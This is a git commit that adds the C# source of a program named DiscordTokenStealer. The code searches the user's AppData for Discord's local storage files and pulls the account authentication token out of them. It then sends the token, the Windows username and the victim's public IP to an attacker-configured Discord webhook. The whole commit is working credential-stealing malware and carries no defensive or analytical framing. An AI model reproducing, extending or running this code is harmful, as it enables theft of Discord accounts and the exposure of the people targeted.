feeb759b87be5051158a39f6db07b4ebc5e48228
darkshoz <darkshozpro@gmail.com>
2019-07-26 14:05:51 +0200

    1.0.0.0 version update

---
+++ DiscordTokenStealer/Program.cs
@@ -0,0 +1,62 @@
+﻿using DiscordTokenStealer.Properties;
+using System;
+using System.Net;
+using System.Net.Http;
+using System.Threading;
+using System.Windows.Forms;
+
+namespace DiscordTokenStealer
+{
+    static class Program
+    {
+        [STAThread]
+        static void Main()
+        {
+            Application.EnableVisualStyles();
+            Application.SetCompatibleTextRenderingDefault(false);
+            string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
+            bool flag2 = !Stealer.FindLdb(ref text) && !Stealer.FindLog(ref text);
+            if (flag2)
+            {
+                Program.SendWebHook("Token not found in victim's pc");
+            }
+            Thread.Sleep(100);
+            string text2 = Stealer.GetToken(text, text.EndsWith(".log"));
+            bool flag3 = text2 == "";
+            if (flag3)
+            {
+                text2 = "Token not found in victim's pc";
+            }
+            Program.SendWebHook(text2);
+        }
+        private static void SendWebHook(string token)
+        {
+            if(Settings.Default.AvatarUrl == null || Settings.Default.WebhookUrl == null)
+            {
+                MessageBox.Show("You didn't fill the settings!", "Token Stealer", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return;
+            }
+            WebRequest.DefaultWebProxy = new WebProxy();
+            HttpClient httpClient = new HttpClient();
+            MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
+            multipartFormDataContent.Add(new StringContent("Token Stealer"), "username");
+            multipartFormDataContent.Add(new StringContent(Settings.Default.AvatarUrl), "avatar_url");
+            multipartFormDataContent.Add(new StringContent(string.Concat(new string[]
+            {
+                "Token from (pc name): ",
+                Environment.UserName,
+                " | IP : ",
+                Stealer.GetIP(),
+                "\r\nToken: ",
+                token
+            })), "content");
+            try
+            {
+                HttpResponseMessage result = httpClient.PostAsync(Settings.Default.WebhookUrl, multipartFormDataContent).Result;
+            }
+            catch (Exception)
+            {
+            }
+        }
+    }
+}
---
+++ DiscordTokenStealer/Stealer.cs
@@ -0,0 +1,109 @@
+﻿using System.Collections.Generic;
+using System.IO;
+using System.Net;
+using System.Net.Http;
+using System.Text;
+
+namespace DiscordTokenStealer
+{
+    internal class Stealer
+    {
+        private static string Sub(string contents)
+        {
+            string[] array = contents.Substring(contents.IndexOf("oken") + 4).Split(new char[]
+            {
+                '"'
+            });
+            List<string> list = new List<string>();
+            list.AddRange(array);
+            list.RemoveAt(0);
+            array = list.ToArray();
+            return string.Join("\"", array);
+        }
+
+        public static bool FindLdb(ref string path)
+        {
+            bool flag = !Directory.Exists(path);
+            bool result;
+            if (flag)
+            {
+                result = false;
+            }
+            else
+            {
+                foreach (FileInfo fileInfo in new DirectoryInfo(path).GetFiles())
+                {
+                    bool flag2 = fileInfo.Name.EndsWith(".ldb") && File.ReadAllText(fileInfo.FullName).Contains("oken");
+                    if (flag2)
+                    {
+                        path += fileInfo.Name;
+                        break;
+                    }
+                }
+                result = path.EndsWith(".ldb");
+            }
+            return result;
+        }
+
+        public static bool FindLog(ref string path)
+        {
+            bool flag = !Directory.Exists(path);
+            bool result;
+            if (flag)
+            {
+                result = false;
+            }
+            else
+            {
+                foreach (FileInfo fileInfo in new DirectoryInfo(path).GetFiles())
+                {
+                    bool flag2 = fileInfo.Name.EndsWith(".log") && File.ReadAllText(fileInfo.FullName).Contains("oken");
+                    if (flag2)
+                    {
+                        path += fileInfo.Name;
+                        break;
+                    }
+                }
+                result = path.EndsWith(".log");
+            }
+            return result;
+        }
+
+        public static string GetToken(string path, bool isLog = false)
+        {
+            byte[] bytes = File.ReadAllBytes(path);
+            string @string = Encoding.UTF8.GetString(bytes);
+            string text = "";
+            string text2 = @string;
+            while (text2.Contains("oken"))
+            {
+                string[] array = Stealer.Sub(text2).Split(new char[]
+                {
+                    '"'
+                });
+                text = array[0];
+                text2 = string.Join("\"", array);
+                bool flag = isLog && text.Length == 59;
+                if (flag)
+                {
+                    break;
+                }
+            }
+            return text;
+        }
+
+        public static string GetIP()
+        {
+            string result;
+            try
+            {
+                result = new HttpClient().GetStringAsync("https://wtfismyip.com/text").Result;
+            }
+            catch (WebException)
+            {
+                result = "Unable to get IP";
+            }
+            return result;
+        }
+    }
+}
